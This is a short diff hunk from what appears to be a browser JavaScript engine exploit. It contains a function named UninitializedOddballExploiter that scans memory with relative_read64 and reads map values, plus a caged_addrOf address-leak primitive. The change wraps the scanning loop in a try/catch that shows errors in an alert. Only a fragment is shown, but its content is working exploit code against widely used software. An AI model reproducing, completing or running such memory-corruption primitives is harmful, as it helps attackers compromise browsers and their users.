@@ -222,8 +222,8 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
         const array_map = 0x243139;
 
         let start_offset = Math.floor(old_space / 8) + 3;
-
-        for (var i = start_offset; i < start_offset + 0x6b000; i++) {
+        try{
+            for (var i = start_offset; i < start_offset + 0x6b000; i++) {
             let value = relative_read64(i);
             helpers.set_i64(value);
             var [hi, lo] = helpers.get_u32_pair();
@@ -244,7 +244,11 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
                     return [i, hi == 2734n ? 0 : 1];
                 }
             }   
+            }
+        }catch(e){
+            alert("error:"+e);
         }
+        
     }
 
     function caged_addrOf(object) {
